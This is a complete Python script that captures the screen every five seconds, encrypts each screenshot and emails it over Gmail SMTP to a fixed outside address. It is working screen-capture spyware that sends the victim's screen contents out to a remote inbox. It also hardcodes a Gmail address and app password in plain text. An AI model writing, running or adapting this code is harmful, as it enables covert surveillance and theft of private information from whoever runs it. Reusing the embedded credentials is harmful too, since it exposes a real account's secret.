from cryptography.fernet import Fernet
from PIL import ImageGrab  # For screenshots
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import time

# Load the encryption key (the same key used to encrypt the data)
with open("encryption_key.key", "rb") as key_file:
    ENCRYPTION_KEY = key_file.read()

# Initialize Fernet for encryption
cipher = Fernet(ENCRYPTION_KEY)

# Email details
EMAIL_ADDRESS = "tejasreea9182@gmail.com"
EMAIL_PASSWORD = "oblo eoqg nnuz xgkc"
TO_EMAIL = "tejasreea85@gmail.com"

# Function to take a screenshot and return as in-memory bytes
def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("temp_screenshot.png")
    return "temp_screenshot.png"

# Function to encrypt the screenshot
def encrypt_screenshot(file_path):
    with open(file_path, "rb") as f:
        file_data = f.read()

    # Encrypt the file data
    encrypted_data = cipher.encrypt(file_data)

    # Save the encrypted screenshot temporarily
    encrypted_file_path = "temp_screenshot.encrypted"
    with open(encrypted_file_path, "wb") as ef:
        ef.write(encrypted_data)

    return encrypted_file_path

# Function to send an email with the encrypted screenshot
def send_email_with_encrypted_screenshot(email, password, file_path):
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(email, password)
            
            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = TO_EMAIL
            msg['Subject'] = "Encrypted Screenshot"

            # Attach encrypted screenshot
            with open(file_path, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(file_path)}")
                msg.attach(part)

            server.sendmail(email, TO_EMAIL, msg.as_string())
            print("Encrypted screenshot sent successfully.")
    except Exception as e:
        print(f"Error sending email: {e}")

# Main loop to take screenshot and send email every 5 seconds
while True:
    screenshot_path = take_screenshot()  # Take a screenshot
    encrypted_screenshot_path = encrypt_screenshot(screenshot_path)  # Encrypt the screenshot
    send_email_with_encrypted_screenshot(EMAIL_ADDRESS, EMAIL_PASSWORD, encrypted_screenshot_path)  # Send the encrypted screenshot

    # Delete temporary files
    os.remove(screenshot_path)
    os.remove(encrypted_screenshot_path)

    time.sleep(5)  # Wait for 5 seconds before taking the next screenshot